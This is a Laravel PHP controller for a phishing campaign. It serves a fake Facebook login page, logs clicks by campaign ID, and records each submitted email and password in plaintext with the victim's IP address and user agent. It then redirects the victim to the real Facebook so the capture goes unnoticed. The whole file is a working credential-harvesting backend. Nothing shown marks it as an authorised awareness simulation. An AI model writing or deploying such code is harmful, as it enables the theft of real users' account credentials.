<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Phishinglog;
use App\Models\Clicklog;
use App\Models\Campaign;
use Illuminate\Http\RedirectResponse;
use Illuminate\View\View;


class phishingcontoller extends Controller
{
    public function showLoginPage(Request $request):View{
        $campaign_id = $request->query('campaign_id');
        
        // Track the click
        if($campaign_id && Campaign::find($campaign_id)) {
            Clicklog::create([
                'campaign_id' => $campaign_id,
                'visitor_ip' => $request->ip(),
                'user_agent' => $request->header('User-Agent'),
                'referer' => $request->header('Referer'),
            ]);
        }
        
        return view('phishing.facebook', ['campaign_id' => $campaign_id]);
    }


    public function captureCredentials(Request $request):RedirectResponse{
        $campaign_id = $request->input('campaign_id');

        Phishinglog::create([
            'campaign_id' => $campaign_id,
            'email' => $request->email,
            'password' => $request->password,
            'ip_address' => $request->ip(),
            'user_agent' => $request->header('User-Agent'),
        ]);

        return redirect(to:"https://www.facebook.com");
    }
}
